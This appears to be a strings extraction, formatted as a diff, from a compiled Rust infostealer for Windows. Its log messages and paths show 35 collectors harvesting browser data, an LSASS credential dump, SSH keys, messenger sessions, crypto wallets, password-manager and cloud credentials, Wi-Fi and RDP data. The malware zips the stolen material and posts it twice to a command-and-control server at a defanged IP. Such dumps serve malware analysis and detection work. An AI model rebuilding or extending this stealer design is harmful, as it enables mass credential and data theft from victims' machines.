@@ -1,0 +1,399 @@
+ 1072a0                 																~~~~~~~~~~~~~~~~3
+ 1074c8 Large file option has not been set - use .large_file(true) in options
+ 107540 EOCD comment exceeds file boundaryEOCD comment length exceeds u16::MAX
+ 107960 assertion failed: (3..=288).contains(&litlen)
+ 107c3b `Variable-length field extends beyond file boundaryArchive header is too largeAES encryption without AES extra data fieldPK
+ 107cbc Invalid EOCD64: inconsistent number of filesCould not find EOCD64Multi-disk ZIP files are not supportedInvalid EOCD64 Locator CD offset
+ 107d48 No CDFH foundInvalid CDFH offset in EOCDInvalid EOCD comment lengthCould not find EOCD
+ 107f98 AES encrypted files cannot be decrypted without the aes-crypto feature.
+ 1081d8 Invalid UTF8
+ 108200 ullruealse
+ 10820b Unexpected end of 
+ 10821f Invalid digital signature headerInvalid local file headerInvalid zip64 locator digital signature header
+ 1082a0 Invalid Central Directory header
+ 1082d8 Cannot get the extra data startOriginal path is empty
+ 10830e [COLLECTOR] error: 
+ 108324 [WARN] 
+ 108330 [ERROR] 
+ 10833d Failed to canonicalize source '
+ 108363 (Failed to create destination directory '
+ 108393 +Failed to canonicalize destination parent '
+ 1083c7 Destination has no filename: 
+ 1083e6 *Failed to remove stale temporary archive '
+ 108419 Failed to move completed ZIP '
+ 108439 ' to '
+ 108446 )ZIP created but failed to read metadata '
+ 108477 %Destination has no parent directory: 
+ 1084a0 Failed to open generated ZIP '
+ 1084c6 Failed to open ZIP entry #
+ 1084e7 ZIP entry '
+ 1084f3 !' failed integrity verification: 
+ 108517 #Generated file is not a valid ZIP '
+ 108542 APPDATA not foundsrc\main.rs
+ 10855f HOSTNAMEhostname not found0.0.0.0USERPROFILE not found Failed to create temporary ZIP '
+ 1085bd +Failed to calculate relative ZIP path for '
+ 1085f1 Failed to add directory '
+ 10860c ' to ZIP: 
+ 108619 Failed to open source file '
+ 10863d Failed to read metadata for '
+ 108661  Failed to create ZIP entry for '
+ 10868a Failed while compressing '
+ 1086ac Failed to finalize ZIP: 
+ 1086c7 Failed to flush ZIP output: 
+ 1086e5  Failed while traversing source '
+ 10870d LOCALAPPDATA not found'Failed to start lss.exe (need admin?): 
+ 10874e Destination has no parent: 
+ 10876b Failed to generate random key seed
+ 10878e Failed to build HTTP client: 
+ 1087ae HTTP POST failed: 
+ 1087c3 [INJECTOR] 
+ 1087d9 [DEBUG:FAST] Sleeping 
+ 1087f1  seconds...
+ 1087fe [INFO] 
+ 108814 [DEBUG:FAST] [T=
+ 108826 s] Creating FAST ZIP...
+ 10883f [DEBUG:FAST] Pre-ZIP: 
+ 108857  files, 
+ 10886a [DEBUG:FAST] 
+ 10887a  ZIP ready: 
+ 10888c [DEBUG:FAST] 
+ 10889c  Transmission #1 sent[DEBUG:FAST] 
+ 1088c1  ZIP file not found after creation&[DEBUG:FAST] 
+ 1088f4  ZIP creation failed: 
+ 108919 [DEBUG:COMPLETE] Sleeping 
+ 108935  seconds...
+ 108942 [DEBUG:COMPLETE] [T=
+ 108958 s] Creating COMPLETE ZIP...
+ 108975 [DEBUG:COMPLETE] Pre-ZIP: 
+ 108991  files, 
+ 10899f COMPLETE [DEBUG:COMPLETE] 
+ 1089bc  ZIP ready: 
+ 1089ce [DEBUG:COMPLETE] 
+ 1089e2  Transmission #2 sent[DEBUG:COMPLETE] 
+ 108a0b  ZIP file not found after creation*[DEBUG:COMPLETE] 
+ 108a42  ZIP creation failed: 
+ 108a5a [DEBUG:COLLECTORS] Starting...
+ 108a79 [DEBUG:COLLECTORS] 
+ 108a8f  Done in 
+ 108b28 Cannot get last file	[ARCHIVE:
+ 108c0a 	[ARCHIVE:
+ 108c16 ] Starting ZIP creation
+ 108c2e 	[ARCHIVE:
+ 108c3a ] Source: 
+ 108c46 	[ARCHIVE:
+ 108c52 ] Destination: 
+ 108c63 !Source directory does not exist: 
+ 108c87  Source path is not a directory: 
+ 108cab ZIP verification failed: 
+ 108cc6 	[ARCHIVE:
+ 108cd7  ZIP SUCCEEDED in 
+ 108ceb 	[ARCHIVE:
+ 108cf7 ] Archive size: 
+ 108d09  bytes (
+ 108d19  MiB)
+ 108d1f EDestination archive must not be inside the source directory.
+ 108d5d Source: 
+ 108d68 Destination: 
+ 108d83 ] Transmission attempt 
+ 108dad  Forensics transmitted successfully after 
+ 108dd8 	 attempts
+ 108df2   Still retrying... (attempt #
+ 108e12 , backoff: 
+ 108e1e 	 seconds)
+ 108e38   Attempt 
+ 108e43 	 failed: 
+ 108e4f  (retrying in 
+ 108e5e 	 seconds)
+ 108e69 	[ARCHIVE:
+ 108e75 ] Verifying ZIP integrity...
+ 108e92 	[ARCHIVE:
+ 108ea3  ZIP verification succeeded: 
+ 108ec2  files, 
+ 108ed2  MiB in 
+ 108edd ZIP entry '
+ 108eea ' size mismatch: expected 
+ 108f06 , decoded 
+ 108f12 APPDATACOMPUTERNAMESteamGames[STEAM] collectedipconfig/alladapterAdapterMedia StatedisconnectedIPv4 AddressSubnet
+ 108fa0 127.BRIDGE_LOCAL_IPrxinjhelper.exeMZ
+ 2647c2 [INJECTOR] extracted helper.exe-fall
+ 2647e7 [INJECTOR] PID 
+ 2647f8  running (timeout 90s)...
+ 264812 [INJECTOR] timeout after 90s -- killed
+ 264839 [INJECTOR] exit status: 
+ 264853 [INJECTOR] exited cleanlyoutput[INJECTOR] copied browser data to outputUSERPROFILE.sshSSH[SSH] collectedTelegramMessengers[TELEGRAM] collected	[ARCHIVE:
+ 2648ed ] ZIP generation completed in 
+ 26490e [DEBUG] 
+ 26491a 	[ARCHIVE:
+ 264926 ] Added 
+ 264930  files, 
+ 26493a  directories, 
+ 264950  MiB input
+ 26495b +Unsupported filesystem object encountered: 
+ 264989 	[ARCHIVE:
+ 264994 %] File changed while being archived: 
+ 2649bc  (initial size 
+ 2649cd , bytes read 
+ 2649de 	[ARCHIVE:
+ 2649ea ] Progress: 
+ 2649f8  files, 
+ 264a08  MiB processed
+ 264a17 	[ARCHIVE:
+ 264a23 ] Skipping symbolic link: 
+ 264a3f LOCALAPPDATAChatAppsDiscordSlack
+ 264a90 [CHAT] collectedMZ
+ 264aed !This program cannot be run in DOS mode.
+ 264b40 RichAKT
+ 264c68 .text
+ 264c8f `.rdata
+ 264cb7 @.data
+ 264ce0 .pdata
+ 265055 A(H9A0u
+ 265088 AVVWSH
+ 2650c8 ([_^A^
+ 2650f2 AVVWSH
+ 26514d ([_^A^
+ 26515c ([_^A^
+ 265163 AVVWSH
+ 2651bb ([_^A^
+ 26537b AVVWSH
+ 2653d4 ([_^A^
+ 265416 AWAVATVWUSH
+ 2654de  []_^A\A^A_
+ 2655b5 T$8eH
+ 2657b7 AWAVAUATVWUSH
+ 2658d3 t+H;\$Hu
+ 265969 x[]_^A\A]A^A_
+ 265992 D$PeH
+ 265a21 AWAVAUATVWUSH
+ 265f2d []_^A\A]A^A_
+ 26610f HcFP1
+ 266592 H9x0u
+ 2665ce H9ypL
+ 266621 UnknA
+ 26675f D$xH;
+ 266eb2 @H9|$x
+ 2676bf \??\I
+ 2676fc .dmpB
+ 267708 lss.L
+ 267ec0 UAWAVAUATVWSH
+ 26811d H[_^A\A]A^A_]
+ 268140 UAVVWSH
+ 268199  [_^A^]
+ 2681b0 UAWAVVWSH
+ 268253 ffff.
+ 2683a1 [_^A^A_]
+ 2683b0 AWAVATVWSH
+ 26843e ([_^A\A^A_
+ 268480 UAWAVVWSH
+ 268506 ([_^A^A_]
+ 26881c .text
+ 26882c .text$unlikely
+ 268844 .rdata
+ 268854 .rdata$voltmd
+ 26886c .rdata$zzzdbg
+ 268884 .xdata
+ 2688a4 .pdata
+ 268ca0 rxlsslss.exe[LSASS] running lss.exe...[LSASS] timeoutlss.dmpmimikatz-credentials
+ 268cf1 [LSASS] dump 
+ 268d00  bytes
+ 268d07 [LSASS] dump missing (need admin?)Signal
+ 268d60 [MESSENGERS] collectedYandexYandexBrowserUser Data[YANDEX] collectedMozillaFirefoxProfiles[FIREFOX] collected[SEEDS] stubhxxp://ip-api[.]com/json/?fields=countryCodecountryCodeXXEmailClientsThunderbird[EMAIL] collectedWindowsVault[VAULT] collectedRDPConnectionsDocumentsDefault.rdp[RDP] collectedWiFipowershell-Commandnetsh wlan show profiles
+ 268ed8 wifi_networks.txt[WIFI] collected
+ 268efd .partial
+ 268f06 DevCredentials.netrc.gitconfig
+ 268f48 [DEV] collectedGit[GIT] collectedprivilegeswhoami/groupsy
+ 268f90 privileges.txt[PRIVILEGES] collected[SCREENSHOT] stubSensitiveFiles.aws.config/gcloud
+ 269018 [SENSITIVE] collectedVPNOpenVPNWireGuardNordVPN
+ 269078 [VPN] collected[LATERAL] collectedWalletsGoogle\Chrome\User DataChromeMicrosoft\Edge\User DataEdgeBraveSoftware\Brave-Browser\User DataBrave[WALLETS] collectedLocal Extension SettingsCloudCredentials.azure.gcp
+ 269180 [CLOUD] collectedOneDrivePictures[ONEDRIVE] collectedPasswordManagersLastPass1PasswordBitwardenKeePass
+ 269228 [PASSWORD_MANAGERS] collectedtasklistprocesses.txt[PROCESSES] collectedHighValueenvDesktopDownloads
+ 2692c0 [HIGHVALUE] collected
+ 2692f0 NotesMicrosoftOneNote[NOTES] collectedRemoteAccessTeamViewerAnyDesk
+ 269358 [REMOTE_ACCESS] collected
+ 269374   "timestamp": 
+ 269387   "hostname": "
+ 26939b   "country": "
+ 2693ae   "ip": "
+ 2693be [PARALLEL] spawning 
+ 2693d4  collectors
+ 2693e0 [PARALLEL] waiting for all 35 collectors to complete (max 5 minutes)....[PARALLEL] 
+ 269436  ALL 35 COLLECTORS COMPLETED in 
+ 269459 [PARALLEL] 
+ 269466  threads joined so far...
+ 269481 [HTTP:
+ 269488 $] Preparing forensics transmission (
+ 2694af  bytes)...
+ 2694ba 93.152.213[.]149
+ 2694d8 /api/forensics
+ 2694f9 https://
+ 269505 [HTTP:
+ 26950d ] Server URL: 
+ 269521 /api/agent/connect
+ 269534 nonce
+ 269545 message_idtypeforensics.zipdevice_idsequencesent_atcountrypublic_ipsize_byteszip_file
+ 26959b [HTTP:
+ 2695a3 ] Streaming 
+ 2695b1  bytes to server...
+ 2695c5 X-Device-IDX-SignatureX-CountryX-Public-IP
+ 2695f0 HTTP 
+ 2695fc [HTTP:
+ 269609  Server error: 
+ 26961b [HTTP:
+ 269628  Transmission successful (HTTP 
+ 26964c [HTTP:
+ 269654 ] Server response: 
+ 269669 [GEO] Geo-blocking disabled (GEO_BLOCKING_ENABLED=false) 
+ 2696a5  skipping checkEnvironmentsystem_env.txt[ENVIRONMENT] collected
+ 2696eb Opera Software\Opera StableOperaVivaldi\User DataVivaldi[CHROMIUM] collectedGoogleBrowsersinstalled_browsers.txt[BROWSERS] collectedGet-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName
+ 2697f8 Softwareinstalled_software.txt[SOFTWARE] collected[2FA] stub
+ 269923             PRODUCTION RUST CLIENT - DUAL TRANSMISSION STRATEGY              
+ 269977           Fast ZIP at 90s + Complete ZIP at 5min (NEVER SKIPS DATA)            
+ 269ab6 initializing...rxclient
+ 269ace temp dir: 
+ 269ada octo-fingerprint.jsonfingerprint saved[MAIN] 
+ 269bc4 [MAIN] DUAL TRANSMISSION STRATEGY[MAIN]   
+ 269bf1  T=90s:  FAST ZIP (whatever is ready) 
+ 269c1a  Transmission #1[MAIN]   
+ 269c36  T=300s: COMPLETE ZIP (all data) 
+ 269c5a  Transmission #2[MAIN] starting all collectors...[DEBUG:MAIN] 
+ 269c9b  Spawning parallel threads (collectors + 2 timing threads)[DEBUG:MAIN] Collectors + FAST (T=90s) + COMPLETE (T=300s) running in parallel...[DEBUG:MAIN] Waiting for collectors...[DEBUG:MAIN] 
+ 269d5c  Collectors thread panicked[MAIN] waiting for helper thread...[MAIN] 
+ 269da4  helper thread complete[DEBUG:MAIN] Waiting for TRANSMISSION #1 (T=90s)...[DEBUG:MAIN] 
+ 269dfe  FAST thread panicked[DEBUG:MAIN] Waiting for TRANSMISSION #2 (T=300s)...[DEBUG:MAIN] 
+ 269e57  COMPLETE thread panicked[MAIN] cleaning up temporary directory'[TIMING:SUMMARY] Total execution time: 
+ 269ec0 [DEBUG:MAIN] 
+ 269ed0  All transmissions complete
+ 269fdd                     DUAL TRANSMISSION SUCCESSFUL 
+ 26a011                           
+ 26a039  TRANSMISSION #1 (FAST @ T=90s):      Sent to C2                        
+ 26a08f  TRANSMISSION #2 (COMPLETE @ T=300s): Sent to C2                        
+ 26a0de               Total time: 
+ 26a0fc                                            
+ 26a12e              NO DATA SKIPPED - GUARANTEED COMPLETENESS                       
+ 26a182            All collectors running in parallel - maximum data!                 
+ 26a2c1 [SHUTDOWN] 
+ 26a38c [SHUTDOWN] Starting 10-minute data sync period...[SHUTDOWN] (Ensures OS flushes all buffered writes to disk)
+ 26a3f9 [SHUTDOWN] 
+ 26a40a s remaining...
+ 26a419 [SHUTDOWN] 10-minute sync complete
+ 26a580 writing rfc3339 datetime to string should never fail
+ 26a657 Oversized central directorySupport for multi-disk files is not implementedPassword required to decrypt file
+ 26a6c4 @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBJHJHJHJHJHJHJHJHJHJHJHJHJHJHJHJHJHJHJHJHJHJHJHJHJHJHJHJHJHJHJHLJLJLJLJLJLJLJLJLJLJLJLJLJLJLJLJLJLJLJLJLJLJLJLJLJLJLJLJLJLJPNPNPNPNPNPNPNPNPNPNPNPNPNPNPNPNPNPNPNPNPNPNPNPNPNPNPNPNPNPNPNRPRPRPRPRPRPRPRPRPRPRPRPRPRPRPRPRPRPRPRPRPRPRPRPRPRPRPRPRPRPVTVTVTVTVTVTVTVTVTVTVTVTVTVTVTVTVTVTVTVTVTVTVTVTVTVTVTVTVTVTVTXVXVXVXVXVXVXVXVXVXVXVXVXVXVXVXVXVXVXVXVXVXVXVXVXVXVXVXVXVXVXVZXZXZXZXZXZXZXZXZXZXZXZXZXZXZXZXZXZXZXZXZXZXZXZXZXZXZXZXZXZX^\^\^\^\^\^\^\^\^\^\^\^\^\^\^\^\^\^\^\^\^\^\^\^\^\^\^\^\^\^\^\`^`^`^`^`^`^`^`^`^`^`^`^`^`^`^`^`^`^`^`^`^`^`^`^`^`^`^`^`^`^dbdbdbdbdbdbdbdbdbdbdbdbdbdbdbdbdbdbdbdbdbdbdbdbdbdbdbdbdbdbdb
+ 26a9e8 ZipFileReader was in an invalid stateShould have switched to stored and unencrypted beforehand
+ 26aa47 Duplicate filename: 
+ 26aa5d internal error: entered unreachable code: switch_to_non_encrypting_writer called with incompatible GenericZipWriter variantfB.@
+ 26aaf0 ZipWriter was already closed
+ 26ab30 Unsupported compression level
+ 26b131 Error: 
+ 26b158 FromUtf8Errorbytes
+ 26b210 No file has been startedwrite(): ZipWriter was already closed
+ 26b268 <Large file option has not been set and abort_file() failed: 
+ 26b2a7 Large file option has not been set
+ 26b3a0 number of read bytes exceeds limit
+ 26b458 -ZipWriter::drop: failed to finalize archive: 
+ 26b559 swap_remove index (is 
+ 26b571 ) should be < len (is 
+ 26b5a9 removal index (is 
+ 26b5bd ) should be < len (is 
+ 26b5d8 `at` split index (is 
+ 26b5ef ) should be <= len (is 
+ 26c248 *range start must not be greater than end: 
+ 26c27c range end out of bounds: 
+ 26c2b8 "advance out of bounds: the len is 
+ 26c2dd  but advancing by 
+ 26c368 )size too large: the integer type can fit 
+ 26c394  bytes, but nbytes is 
+ 26c411 split_to out of bounds: 
+ 26c451 split_off out of bounds: 
+ 26c929     !!!!""""####$$$$%%%%&&&&''''(((())))****++++,,,,----....////00001111111122223333444455556666777788889999::::;;;;<<<<====>>>>????@@@@AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ[[[[\\\\]]]]^^^^____````aaaa
+ 26ca70 SystemTimeError
+ 26d3a0 +NaN0.assertion failed: buf.len() >= maxlen
+ 26d488  { .. }, .. }..
+ 26d49a 18446744073709551616
+ 26d4b9 Formatting argument out of range
+ 26d858 to_digit: invalid radix -- radix must be in the range 2 to 36 inclusive
+ 26d97b assertion failed: other > 0assertion failed: noborrowh
+ 26dadc 0000000000000000000000000000000000000000000000000000000000000000
+ 26dbb1 start byte index 
+ 26dbc3 & is not a char boundary; it is inside 
+ 26dbec  (bytes 
+ 26dbf6  of string)
+ 26dc03 end byte index 
+ 26dc13 & is not a char boundary; it is inside 
+ 26dc3c  (bytes 
+ 26dc46  of string)
+ 26dc53 end byte index 
+ 26dc63 ' is out of bounds for string of length 
+ 26dc8e byte range starts at 
+ 26dca5  but ends at 
+ 26dcb5 start byte index 
+ 26dcc7 ' is out of bounds for string of length 
+ 26dd88  index out of bounds: the len is 
+ 26ddab  but the index is 
+ 26ddc4 assertion `left 
+ 26ddd6  right` failed
+ 26dde5   left: 
+ 26ddf0  right: 
+ 26ddfb assertion `left 
+ 26de0d  right` failed: 
+ 26de20   left: 
+ 26de2b  right: 
+ 26de35 panic in a function that cannot unwind
+ 26de5c range end index 
+ 26de6d " out of range for slice of length 
+ 26de93 slice index starts at 
+ 26deab  but ends at 
+ 26debb range start index 
+ 26dece " out of range for slice of length 
+ 26dfd5 ';>NO
+ 26dfe9 	6=>V
+ 26e009 )14:EFIJNOde
+ 26e050 ./'(U
+ 26e07d  #%&(38:HJLPSUVXZ\^`cefksx}
+ 26e300 ./?\]_
+ 26e31c )147:;=IJ]
+ 26e33a )14:;EFIJ^de
+ 26e34f ):;EIW[^_de
+ 26e389 INOWY^_
+ 26e3bd FGNOXZ\^~
+ 26e3d2 tu&./
+ 26e3f5 no7=?BESgu
+ 26e5b8 attempt to divide by zeroattempt to calculate the remainder with a divisor of zero`async fn` resumed after completionassertion failed: !buf.is_empty()
+ 26e668 assertion failed: buf[0] > b'0'
+ 26eb46  !|, /
+ 26eb8f e@m!fOo
+ 26ebe1 ,`+*0
+ 26ec1d jaUOo
+ 26ee40 )1$N*-Q
+ 26efe1 TUUUUUU
+ 26f018 UUUUUU
+ 26f02f {UUUUUU
+ 26f037 lUUUUUU
+ 26f047 UU(EUU}_UUUUUUUUU
+ 26f059 *UUUUUU
+ 26f071 TUUUUU+
+ 26f0e8 UUUUUUU
+ 26f0f1 8'>P=
+ 26f12b #,,,,,,,,,,
+ 26f13b ,,,,,,,,,,,,,,,(,,,,,
+ 26f158 ,,, $
+ 26f167 ',,,,	
+ 26f16e -,,,,,,,,,,,,,%
+ 26f17e C,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,9,,,,,,,,,,,,1?,,,,,,,,,,,,,,A@,
+ 26f1c8 ,,,,2,,,,,,,,,,,,,5,,
+ 26f1de ,,,,,,,,,,,,6.,,,,,,,,,,,,3,	/,*!,,,,,,,,,4
+ 26f20d 0,,,,,,,,,,4&
+ 26f21c ,,,,,,,,,,,,:
+ 26f352 U1(\Q
+ 26f4a1 ~)p$w
+ 26f4f1 11eU%
+ 26fb24 &copy_from_slice: source slice length (
+ 26fb4c +) does not match destination slice length (
+ 26fde0 0123456789ABCDEF
+ 26fe52  (1 << 
+ 26fe5d out of range integral type conversion attempted
+ 26fe8d invalid utf-8 sequence of 
+ 26fea9  bytes from index 
+ 26febd *incomplete utf-8 byte sequence from index 
+ 26ff59 ::ffff:
+ 26ff98 RefCell already mutably borrowedRefCell already borrowed
